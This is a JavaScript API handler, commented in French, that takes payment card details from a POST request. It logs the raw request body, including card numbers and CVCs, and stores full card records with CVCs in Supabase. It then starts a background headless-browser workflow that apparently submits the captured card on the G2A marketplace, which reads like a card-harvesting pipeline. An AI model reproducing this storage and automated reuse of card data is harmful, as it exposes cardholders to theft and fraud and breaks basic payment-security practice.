import { proceedG2AWorkflow } from '../../../scripts/puppeteer/g2a/proceed.js';
import { saveCardG2AWorkflow } from '../../../scripts/puppeteer/g2a/save-card.js';
import { createPayment } from '../../../tools/supabase/payments.js';
import { getContactByEmail } from '../../../tools/supabase/contacts.js';
import { storeCard } from '../../../tools/supabase/cards.js';
import { createClient } from '@supabase/supabase-js';
import 'dotenv/config';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cardDetails, amount, contactId, eventId, email } = req.body;
    console.log('req.body:', req.body);
    if (!cardDetails) {
      return res.status(400).json({ error: 'cardDetails are required' });
    }

    // Récupérer automatiquement contactId et eventId si non fournis
    let finalContactId = contactId;
    let finalEventId = eventId;

    if (!finalContactId && email) {
      try {
        const contact = await getContactByEmail(email);
        finalContactId = contact?.id || null;
        console.log('Contact found by email:', finalContactId);
      } catch (e) {
        console.warn('Error getting contact by email:', e.message);
      }
    }

    if (!finalEventId && finalContactId) {
      try {
        // Récupérer le dernier événement pour ce contact
        const { data: events } = await supabase
          .from('events')
          .select('id')
          .eq('contact_id', finalContactId)
          .order('created_at', { ascending: false })
          .limit(1);
        
        finalEventId = events?.[0]?.id || null;
        console.log('Event found for contact:', finalEventId);
      } catch (e) {
        console.warn('Error getting event for contact:', e.message);
      }
    }

    // Mapper les détails de carte vers le format commun
    const mappedCard = {
      cardNumber: cardDetails.cardNumber,
      cardOwner: cardDetails.cardHolder || cardDetails.cardOwner,
      cardExpiration: cardDetails.cardExpiry || cardDetails.cardExpiration,
      cardCVC: cardDetails.cardCvc || cardDetails.cardCVC,
    };

    // Créer un enregistrement de paiement initial dans Supabase (pending)
    const paymentId = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    try {
      await createPayment(
        paymentId,
        'pending',
        amount || 10,
        mappedCard,
        finalContactId,
        finalEventId
      );
    } catch (e) {
      console.warn('createPayment warn:', e.message);
    }

    // Enregistrer la carte pour le contact si disponible
    try {
      if (finalContactId) {
        await storeCard(finalContactId, mappedCard);
      }
    } catch (e) {
      console.warn('storeCard warn:', e.message);
    }

    // Lancer le workflow en arrière-plan sans bloquer la réponse
    saveCardG2AWorkflow({ cardDetails, paymentId })
      .catch((e) => console.error('saveCardG2AWorkflow error (background):', e));

    // Retourner immédiatement le paymentId pour permettre le polling côté front
    return res.status(202).json({ paymentId });
  } catch (error) {
    console.error('Error in proceed checkout:', error);
    res.status(500).json({ error: error.message });
  }
}
